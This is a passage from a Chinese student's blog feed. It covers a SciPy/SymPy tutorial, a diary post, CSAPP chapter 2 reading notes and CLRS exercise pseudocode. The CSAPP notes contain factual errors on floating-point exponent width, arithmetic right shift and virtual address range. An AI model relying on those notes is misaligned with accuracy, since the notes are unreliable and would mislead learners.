    实验数据x, y和拟合函数之间的差，p为拟合需要找到的系数
    """</span>
    <span class="token keyword">return</span> y <span class="token operator">-</span> func<span class="token punctuation">(</span>x<span class="token punctuation">,</span> p<span class="token punctuation">)</span>

x <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
A<span class="token punctuation">,</span> k<span class="token punctuation">,</span> theta <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0.34</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>pi<span class="token operator">/</span><span class="token number">6</span> <span class="token comment" spellcheck="true"># 真实数据的函数参数</span>
y0 <span class="token operator">=</span> func<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token punctuation">[</span>A<span class="token punctuation">,</span> k<span class="token punctuation">,</span> theta<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 真实数据</span>
y1 <span class="token operator">=</span> y0 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>len<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 加入噪声之后的实验数据    </span>

p0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 第一次猜测的函数拟合参数</span>

<span class="token comment" spellcheck="true"># 调用leastsq进行数据拟合</span>
<span class="token comment" spellcheck="true"># residuals为计算误差的函数</span>
<span class="token comment" spellcheck="true"># p0为拟合参数的初始值</span>
<span class="token comment" spellcheck="true"># args为需要拟合的实验数据</span>
plsq <span class="token operator">=</span> leastsq<span class="token punctuation">(</span>residuals<span class="token punctuation">,</span> p0<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>y1<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> u<span class="token string">"真实参数:"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>A<span class="token punctuation">,</span> k<span class="token punctuation">,</span> theta<span class="token punctuation">]</span> 
<span class="token keyword">print</span> u<span class="token string">"拟合参数"</span><span class="token punctuation">,</span> plsq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 实验数据拟合后的参数</span>

pl<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y0<span class="token punctuation">,</span> label<span class="token operator">=</span>u<span class="token string">"真实数据"</span><span class="token punctuation">)</span>
pl<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> label<span class="token operator">=</span>u<span class="token string">"带噪声的实验数据"</span><span class="token punctuation">)</span>
pl<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> func<span class="token punctuation">(</span>x<span class="token punctuation">,</span> plsq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span>u<span class="token string">"拟合数据"</span><span class="token punctuation">)</span>
pl<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>
pl<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>通过leastsq函数对带噪声的实验数据x, y1进行数据拟合，可以找到x和真实数据y0之间的正弦关系的三个参数： A, k, theta。</p>
<h3 id="u51FD_u6570_u6700_u5C0F_u503C"><a href="#u51FD_u6570_u6700_u5C0F_u503C" class="headerlink" title="函数最小值"></a>函数最小值</h3><p>optimize库提供了几个求函数最小值的算法：fmin, fmin_powell, fmin_cg, fmin_bfgs。就只举一个小例子：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scipy<span class="token punctuation">.</span>optimize <span class="token keyword">import</span> fmin
<span class="token keyword">def</span> <span class="token function">myfunc</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> x<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">8</span>
x0<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
xopt<span class="token operator">=</span>fmin<span class="token punctuation">(</span>myfunc<span class="token punctuation">,</span>x0<span class="token punctuation">)</span>
<span class="token keyword">print</span> xopt
</code></pre>
<p>返回结果：</p>
<pre class=" language-python"><code class="language-python">Optimization terminated successfully<span class="token punctuation">.</span>
         Current function value<span class="token punctuation">:</span> <span class="token number">4.000000</span>
         Iterations<span class="token punctuation">:</span> <span class="token number">11</span>
         Function evaluations<span class="token punctuation">:</span> <span class="token number">22</span>
<span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</code></pre>
<p>其中 x0 为 初始估计值。</p>
<h2 id="SymPy"><a href="#SymPy" class="headerlink" title="SymPy"></a>SymPy</h2><p>SymPy是Python的数学符号计算库，用它可以进行数学公式的符号推导。常用的导入方法是：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>
</code></pre>
<h3 id="u7B26_u53F7_u53D8_u91CF"><a href="#u7B26_u53F7_u53D8_u91CF" class="headerlink" title="符号变量"></a>符号变量</h3><p>在SymPy中，数学符号是Symbol类的对象.</p>
<pre class=" language-python"><code class="language-python">x <span class="token operator">=</span> Symbol<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>
</code></pre>
<p>此时， x 是一个数学符号。</p>
<p><code>I</code> 在 Sympy 中表示虚数单位</p>
<h3 id="u6709_u7406_u6570"><a href="#u6709_u7406_u6570" class="headerlink" title="有理数"></a>有理数</h3><p>SymPy 中有三种不同的数值类型：<code>Real</code>，<code>Rational</code>，<code>Integer</code>：</p>
<pre class=" language-python"><code class="language-python">r1 <span class="token operator">=</span> Rational<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="http://www.zhihu.com/equation?tex=%5Cfrac%7B4%7D%7B5%7D%20" alt=""></p>
<p>r1就是一个分数。</p>
<h3 id="u6570_u503C_u8BA1_u7B97"><a href="#u6570_u503C_u8BA1_u7B97" class="headerlink" title="数值计算"></a>数值计算</h3><p>Sumpy 以任意精度的数值库作为后端，预定义了一些数学常量的表达式，如 <code>pi</code>, <code>e</code>, 以及 <code>oo</code>（代表极限）。</p>
<p>为了计算表达式的数值，可以使用 <code>evalf</code> 函数 (或者 <code>N</code> 函数)。</p>
<p>显示pi的50位。n参数决定有效数位。</p>
<pre class=" language-python"><code class="language-python">pi<span class="token punctuation">.</span>evalf<span class="token punctuation">(</span>n<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>
</code></pre>
<p>subs函数可以将算式中的符号进行替换:</p>
<ul>
<li>expression.subs(x, y) : 将算式中的x替换成y</li>
<li>expression.subs({x:y,u:v}) : 使用字典进行多次替换</li>
<li>expression.subs([(x,y),(u,v)]) : 使用列表进行多次替换</li>
</ul>
<pre class=" language-python"><code class="language-python">y <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> pi<span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">2</span>
</code></pre>
<p><img src="http://www.zhihu.com/equation?tex=y%3D(x%2B%5Cpi%20\" alt="">%5E%7B2%7D%20)</p>
<p>以上式子中的 <code>x</code> 若要替换成其他值，可以这么写：</p>
<pre class=" language-python"><code class="language-python">y<span class="token punctuation">.</span>subs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">1.5</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="u4EE3_u6570_u8FD0_u7B97"><a href="#u4EE3_u6570_u8FD0_u7B97" class="headerlink" title="代数运算"></a>代数运算</h3><h4 id="u5C55_u5F00_u4E0E_u5206_u89E3"><a href="#u5C55_u5F00_u4E0E_u5206_u89E3" class="headerlink" title="展开与分解"></a>展开与分解</h4><p><code>expand</code> 函数可以将公式展开。</p>
<pre class=" language-python"><code class="language-python">expand<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="http://www.zhihu.com/equation?tex=x^{3}%2B6%20x^{2}%2B11x%2B6" alt=""></p>
<p><code>expand</code> 有一系列参数能够决定式子的展开形式，<code>trig=True</code> 能展开三角公式：</p>
<pre class=" language-python"><code class="language-python">expand<span class="token punctuation">(</span>sin<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> trig<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="http://www.zhihu.com/equation?tex=sin(a%2Bb\" alt="">%3Dsin(a)cos(b)%2Bcos(a)sin(b))</p>
<h4 id="u5316_u7B80"><a href="#u5316_u7B80" class="headerlink" title="化简"></a>化简</h4><p><code>simplify</code> 进行化简操作，特殊的化简还有 <code>trigsimp</code>， <code>powsimp</code>， <code>logcombine</code> 等等。</p>
<h4 id="u5206_u5F0F_u5206_u89E3_u4E0E_u5206_u5F0F_u5C55_u5F00"><a href="#u5206_u5F0F_u5206_u89E3_u4E0E_u5206_u5F0F_u5C55_u5F00" class="headerlink" title="分式分解与分式展开"></a>分式分解与分式展开</h4><pre class=" language-python"><code class="language-python">f1 <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="http://www.zhihu.com/equation?tex=-%5Cfrac%7B1%7D%7Ba%2B2%7D%20%2B%5Cfrac%7B1%7D%7Ba%2B1%7D%20" alt=""></p>
<h2 id="u5FAE_u79EF_u5206"><a href="#u5FAE_u79EF_u5206" class="headerlink" title="微积分"></a>微积分</h2><h4 id="u5FAE_u5206"><a href="#u5FAE_u5206" class="headerlink" title="微分"></a>微分</h4><p>diff 函数用来做微分,<img src="http://www.zhihu.com/equation?tex=y%3D(x%2B%5Cpi%20\" alt="">%5E%7B2%7D%20),对 y 做 x 的微分，</p>
<pre class=" language-python"><code class="language-python">diff<span class="token punctuation">(</span>y<span class="token punctuation">,</span> x<span class="token punctuation">)</span>
</code></pre>
<pre class=" language-python"><code class="language-python">diff<span class="token punctuation">(</span>y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<p>这个表示对 y 做 x 的二次微分，第三个参数表示几重微分。</p>
<p>计算多变量式子的多重微分可以这么做：<br><img src="http://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5E%7B3%7Df%7D%7Bdxdy%5E%7B2%7D%20%7D%20" alt=""></p>
<pre class=" language-python"><code class="language-python">diff<span class="token punctuation">(</span>f<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<p>表示先对 f 做 x 的一重微分，再做 y 的二重微分。</p>
<h3 id="u79EF_u5206"><a href="#u79EF_u5206" class="headerlink" title="积分"></a>积分</h3><p>使用 <code>integrate</code> 函数求积分。</p>
<pre class=" language-python"><code class="language-python">integrate<span class="token punctuation">(</span>f<span class="token punctuation">,</span> x<span class="token punctuation">)</span>
</code></pre>
<p>表示对 <code>f</code> 做 <code>x</code> 的积分。</p>
<pre class=" language-python"><code class="language-python">integrate<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>表示对 <code>f</code> 做 <code>x</code> 的积分，其中 <code>x</code> 属于 <code>-1</code> 到 <code>1</code>。</p>
<h3 id="u603B_u548C_u4E0E_u8FDE_u4E58_u79EF"><a href="#u603B_u548C_u4E0E_u8FDE_u4E58_u79EF" class="headerlink" title="总和与连乘积"></a>总和与连乘积</h3><p>求总和：</p>
<p><img src="http://www.zhihu.com/equation?tex=%5Csum_%7Bn%3D1%7D%5E%7B10%7D%20%5Cfrac%7B1%7D%7Bn%5E%7B2%7D%7D" alt=""></p>
<pre class=" language-python"><code class="language-python">n <span class="token operator">=</span> Symbol<span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span>
Sum<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span>n<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>求连乘积：</p>
<p><img src="http://www.zhihu.com/equation?tex=%5Cprod_%7Bn%3D1%7D%5E%7B10%7D%20n" alt=""></p>
<pre class=" language-python"><code class="language-python">Product<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="u6781_u9650"><a href="#u6781_u9650" class="headerlink" title="极限"></a>极限</h3><p>计算极限：</p>
<p><img src="http://www.zhihu.com/equation?tex=%5Clim_%7Bx%20%5Crightarrow%200%7D%7B%5Cfrac%7Bsin(x\" alt="">%7D%7Bx%7D%20%7D%20)</p>
<pre class=" language-python"><code class="language-python">limit<span class="token punctuation">(</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span>x<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="u6570_u5217"><a href="#u6570_u5217" class="headerlink" title="数列"></a>数列</h3><p>数列展开的用法：(默认从 x=0 展开)</p>
<p><img src="http://www.zhihu.com/equation?tex=1%20%2B%20x%20%2B%20%5Cfrac%7Bx%5E%7B2%7D%7D%7B2%7D%20%2B%20%5Cfrac%7Bx%5E%7B3%7D%7D%7B6%7D%20%2B%20%5Cfrac%7Bx%5E%7B4%7D%7D%7B24%7D%20%2B%20%5Cfrac%7Bx%5E%7B5%7D%7D%7B120%7D%20%2B%20%5Cmathcal%7BO%7D%5Cleft(x%5E%7B6%7D%5Cright\" alt="">)</p>
<pre class=" language-python"><code class="language-python">series<span class="token punctuation">(</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>
</code></pre>
<h3 id="u89E3_u65B9_u7A0B"><a href="#u89E3_u65B9_u7A0B" class="headerlink" title="解方程"></a>解方程</h3><p><code>solve</code> 能够解方程与方程组:</p>
<pre class=" language-python"><code class="language-python">solve<span class="token punctuation">(</span>x<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>
</code></pre>
<p>解方程组：</p>
<pre class=" language-python"><code class="language-python">solve<span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token operator">+</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> x <span class="token operator">-</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://old.sebug.net/paper/books/scipydoc/index.html" target="_blank" rel="external">用Python做科学计算</a></p>
<p><a href="http://docs.scipy.org/doc/" target="_blank" rel="external">Numpy and Scipy Documentation</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[感觉挺伤的]]></title>
      <url>http://xinqiu.me/2015/10/21/Dairy-4/</url>
      <content type="html"><![CDATA[<p>之前在edx上学习MIT6.001x,辛辛苦苦一大半，已经是拿到B了，就差最后的quiz就能拿A，结果现在连课程记录都没了。没想到毁在照片当初拍的不清晰，没能过认证。因为申请退回了之前付的50$，所以清除了课程记录。真的好伤啊，亏我还花那么多时间。唉，只能这样了。当初还学拿一次证书，只能等到下次了。</p>
<p>最近学校在开展什么学风竞赛月。我觉得这就是浪费时间和经历。不抓抓学习，都在为了这些表明上的形式工作。在我们这种学校，如果不拼着学点实际的东西，真的完全找不到工作。对我来说，拼不了爹，比不过脸，秀不了智商。只能忍受忍受些不解，安心的学点东西。</p>
<p>想起来国庆的时候和嘘嘘兄面基，真的，他给我的变化太大了。当初他可是高中逃晚自习出去打游戏，大学天天窝宿舍打游戏看动漫的人，到大三了，因为经历了一些事情，顿悟了，开始拼命学习。和那些每天在校园里背书，在自习教室学习的人一样，为了心里的一点微光在奋斗。他到大三才知道自己荒废了大一大二。可能失去了才能想起曾经拥有的好。</p>
<p>大二了，感觉少做了些白日梦，变得现实了一点。</p>
<p>愿我在孤独学习的路上，少点坎坷。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[读书笔记——CSAPP第二章]]></title>
      <url>http://xinqiu.me/2015/09/27/csapp-2/</url>
      <content type="html"><![CDATA[<blockquote>
<p>CSAPP(Computer Systems: A Programmer’s Perspective )，中文书名为深入理解计算机系统。这本书的好不需多言。为了锻炼英文阅读能力，我特地买的是英文原版。第一章比较简短，简单的从一段Hello World C程序，慢慢深入计算机底层的运行机制。可以说这一章就是本书的框架。以下是从第二章开始，记录了我遇到的困惑，一些简单的就不再介绍，书上已经写的很详细。</p>
</blockquote>
<!--toc-->
<a id="more"></a>
<h2 id="u7B2C_u4E00_u90E8_u5206__u7A0B_u5E8F_u7ED3_u6784_u548C_u6267_u884C"><a href="#u7B2C_u4E00_u90E8_u5206__u7A0B_u5E8F_u7ED3_u6784_u548C_u6267_u884C" class="headerlink" title="第一部分 程序结构和执行"></a>第一部分 程序结构和执行</h2><h3 id="u4FE1_u606F_u7684_u8868_u793A_u548C_u5904_u7406"><a href="#u4FE1_u606F_u7684_u8868_u793A_u548C_u5904_u7406" class="headerlink" title="信息的表示和处理"></a>信息的表示和处理</h3><h4 id="u4FE1_u606F_u50A8_u5B58"><a href="#u4FE1_u606F_u50A8_u5B58" class="headerlink" title="信息储存"></a>信息储存</h4><p>现代计算机存储和处理的信息以二值信号表示。其中，有三种重要的数字表示。<code>无符号</code>(unsigned)编码基于传统的二进制表示法,表示 大于或者等于零的数字。<code>补码</code>(two’s-complement)编码是表示有符号整数的最常见的方式,有 符号整数就是可以为正或者为负的数字。<code>浮点数</code>(floating-point)编码是表示实数的科学记数法的以二为基数的版本。</p>
<p>大多数计算机使用 8 位的块,或者<code>字节</code>(byte),作为最小的可寻址的存储器单位。机器级程序将存储器视为一个非常大的字节数组,<br>称为<code>虚拟存储器</code>(virtual memory)。存储器的每个字节都由 一个唯一的数字来标识,称为它的<code>地址</code>(address),所有可<br>能地址的集合称为<code>虚拟地址空间</code>(virtual address space)。</p>
<p>每台计算机都有一个<code>字长</code>(word size),指明整数和指针数据的<code>标称大小</code>(nominal size)。字长决定的最重要的系统参数就是虚拟地址空间的最大大小。对于一个字长为 w 位的机器而言,虚拟地址的范围为 0 ~ <img src="http://www.zhihu.com/equation?tex=2^{w-1}" alt="">,程序最多 访问 <img src="http://www.zhihu.com/equation?tex=2^{w}" alt=""> 个字节。</p>
<p>在寻址和字节顺序这一块，有一些需要注意的地方。首先是位表示一个数。存在两种表示方法。<code>小端法</code>(little endian)，最低有效字节在最前面的方式。相反，大端法(big endian)，最高有效字节在最前面的方式。</p>
<p>举个例子，12 34 56 78</p>
<p>小端法：</p>
<pre class=" language-html"><code class="language-html">+----+----+----+----+

|0x78|0x56|0x34|0x12|

+----+----+----+----+
</code></pre>
<p>大端法：</p>
<pre class=" language-html"><code class="language-html">+----+----+----+----+

|0x12|0x34|0x56|0x78|

+----+----+----+----+
</code></pre>
<h4 id="u79FB_u4F4D_u8FD0_u7B97"><a href="#u79FB_u4F4D_u8FD0_u7B97" class="headerlink" title="移位运算"></a>移位运算</h4><p><code>移位</code>运算就是向左移、向右移。向左移(&lt;&lt;)都是舍弃最高位，右端用0来补。而右移就出现了两种形式：<code>逻辑</code>右移（logical）和<code>算术</code>右移（arithmetic）。<code>逻辑右移</code>是在左端用0来补位。<code>算术右移</code>是在左端用1来补位。其中，算术右移对有有符号整数数据的运算非常有用。对于无符号数据，右移必须是逻辑的。</p>
<h4 id="u8865_u7801_u7F16_u7801"><a href="#u8865_u7801_u7F16_u7801" class="headerlink" title="补码编码"></a>补码编码</h4><p>有符号数的表示方法比较常见的是<code>补码</code>(two’s-complement)形式。最高有效位是符号为。如果是0就是正数，1是负数。这个最高有效位算是负权(negative weight)，权重为<img src="http://www.zhihu.com/equation?tex=-2^{w-1}" alt="">，其中w为位数。书中<code>Figure 2.12</code>直白的展示了正负数的表示。</p>
<p>还有其他的表示方法，比如反码(Ones’Complement)、原码(Sign-Magnitude)。</p>
<h4 id="u6709_u7B26_u53F7_u6570_u548C_u65E0_u7B26_u53F7_u6570_u4E4B_u95F4_u7684_u8F6C_u6362"><a href="#u6709_u7B26_u53F7_u6570_u548C_u65E0_u7B26_u53F7_u6570_u4E4B_u95F4_u7684_u8F6C_u6362" class="headerlink" title="有符号数和无符号数之间的转换"></a>有符号数和无符号数之间的转换</h4><p>书中写的比较详细，可以参考<code>Figure 2.15</code>，<code>Figure 2.16</code>，<code>Figure 2.17</code>辅助理解。</p>
<h4 id="u6269_u5C55_u4E00_u4E2A_u6570_u5B57_u7684_u4F4D_u8868_u793A"><a href="#u6269_u5C55_u4E00_u4E2A_u6570_u5B57_u7684_u4F4D_u8868_u793A" class="headerlink" title="扩展一个数字的位表示"></a>扩展一个数字的位表示</h4><p>将一个无符号数转为一个更大的数据类型，只需简单的在表示的开头添加0，这种运算称为<code>零扩展</code>(zero extension)。将一个补码数字转换为一个更大的数据类型可以执行<code>符号扩展</code>(sign extension)，规则是在表示中添加最高有效位的值的副本。</p>
<h4 id="u6D6E_u70B9_u6570"><a href="#u6D6E_u70B9_u6570" class="headerlink" title="浮点数"></a>浮点数</h4><p>本书提到了IEEE浮点表示。IEEE浮点标准<img src="http://www.zhihu.com/equation?tex=V=(-1" alt="">^s<em>M</em>2^E)的形式来表示一个数：</p>
<ul>
<li><p>符号(sign) s 决定这个数是负数(s=1)还是正数(s=0),而对于数值 0 的符号位解释作为特殊情况处理。</p>
</li>
<li><p>尾数(significand) M 是一个二进制小数,它的范围是 1 ~ 2 - ε,或者是 0 ~ 1 - ε。</p>
</li>
<li><p>阶码(exponent) E 的作用是对浮点数加权,这个权重是 2 的 E 次幂(可能是负数)。 将浮点数的位表示划分为三个字段,分别对这些值进行编码:</p>
<ul>
<li><p>一个单独的符号位 s 直接编码符号 s。</p>
</li>
<li><p>k位的阶码字段exp=<img src="http://www.zhihu.com/equation?tex=e_{k-1}" alt="">…<img src="http://www.zhihu.com/equation?tex=e_{1}" alt=""><img src="http://www.zhihu.com/equation?tex=e_{0}" alt="">编码阶码E。</p>
</li>
<li><p>n 位小数字段 frac = <img src="http://www.zhihu.com/equation?tex=f_{n-1}" alt="">…<img src="http://www.zhihu.com/equation?tex=f_{1}" alt=""> <img src="http://www.zhihu.com/equation?tex=f_{0}" alt=""> 编码尾数 M,但是编码出来的值也依赖于阶码字段的值是否等于 0。</p>
</li>
</ul>
</li>
</ul>
<p>其中，浮点数32位的阶码有8位，64位的阶码有23位。</p>
<p>对于规格化的值，非规格化的值，特殊值的计算，还需多看书中的知识点。IEEE 754表示法，CSAPP对阶码E的求解和学校教材的不同，这里我有点疑惑，最后还是决定相信CSAPP。</p>
<h4 id="u820D_u5165"><a href="#u820D_u5165" class="headerlink" title="舍入"></a>舍入</h4><p><code>figure 2.36</code> 展示了4中舍入方法，可以简单看看作为了解。</p>
<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>这一章节学习了数的表示。很多人会感觉这块知识感觉没什么用，写个程序用不到这个呀。其实错了，这恰恰是编程中基础的基础。理解计算机是如何工作的，如何处理数的，才能优化程序，减少程序中可以出现的因为对数的操作不当引起的bug。后面的作业和配套的lab正在做。Github上有我的一些解答。希望大家能提出宝贵的建议。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Me]]></title>
      <url>http://xinqiu.me/2015/09/11/Me/</url>
      <content type="html"><![CDATA[<h2 id="u5173_u4E8E_u4E00_u4EBACode"><a href="#u5173_u4E8E_u4E00_u4EBACode" class="headerlink" title="关于一人Code"></a>关于一人Code</h2><p>这是从我开始上大学开始记录的Blog。关于一人Code，算是我自己的写照，多少次夹在两个打LOL的同学之间，敲着厚厚的编程书中源码亦或做做OJ。虽然不是在重点学校，我努力按照国内外重点大学来要求自己。不管是看英文原著或者夯实基础，这期间，应该算是都是自己一个人在做。一人Code，或许只有耐得住寂寞的Coding，才能将来成为一个合格的Coder。</p>
<h2 id="u5173_u4E8E_u6211"><a href="#u5173_u4E8E_u6211" class="headerlink" title="关于我"></a>关于我</h2><p>我是仇鑫，大二网络工程专业。热爱开源和折腾各种技术。平时做做开源翻译和个人小项目，大部分时间还在看基础的知识。关于项目可以在项目页面查看。主要擅长Python，C，docker。从开学开始就一直 Unix/Linux 环境操作，Mysql/Redis这些算是了解熟悉。Raspberry Pi自己入手了2个，也算是小有研究。最近在深入研究Python，顺便和老师在做关于WiFi信号侦测人体运动相关的实验。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[算法导论第2章算法基础练习]]></title>
      <url>http://xinqiu.me/2015/08/31/CLRS-1/</url>
      <content type="html"><![CDATA[<!-- toc -->
<h4 id="2-1-1"><a href="#2-1-1" class="headerlink" title="2.1-1"></a>2.1-1</h4><p>Using Figure 2.2 as a model, illustrate the operation of INSERTION-SORT on the array <code>A = &lt;31, 41, 59, 26, 41, 58&gt;</code>.</p>
<a id="more"></a>
<p><img src="CLRS-1.1.png" alt=""></p>
<h4 id="2-1-2"><a href="#2-1-2" class="headerlink" title="2.1-2"></a>2.1-2</h4><p>Rewrite the INSERTION-SORT procedure to sort into nonincreasing instead of non-decreasing order.</p>
<pre class=" language-python"><code class="language-python">INSERTION<span class="token operator">-</span>SORT<span class="token punctuation">(</span>A<span class="token punctuation">)</span>
<span class="token keyword">for</span> j <span class="token operator">=</span> <span class="token number">2</span> to A<span class="token punctuation">.</span>length
    key <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span>􏰀
    <span class="token operator">//</span> Insert A<span class="token punctuation">[</span>j<span class="token punctuation">]</span> into the sorted sequence A<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">.</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>
    i <span class="token operator">=</span> j <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token keyword">while</span> i <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">and</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> key
        A<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        i <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span>
    A<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key
</code></pre>
<h4 id="2-1-3"><a href="#2-1-3" class="headerlink" title="2.1-3"></a>2.1-3</h4><p>Consider the searching problem:</p>
<p><strong>Input</strong>: A sequence of n numbers A = <a1, a2,="" ...,="" an=""> and a value <em>v</em>.</a1,></p>
<p><strong>Output</strong>: An index i such that <em>v</em> = A[i] or the special value NIL if <em>v</em> does not appear in A.</p>
<pre class=" language-python"><code class="language-python">LINEAR<span class="token operator">-</span>SEARCH<span class="token punctuation">(</span>A <span class="token punctuation">,</span> v<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">1</span> to n
    <span class="token keyword">if</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v
        <span class="token keyword">return</span> i
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>

<span class="token keyword">return</span> NIL
</code></pre>
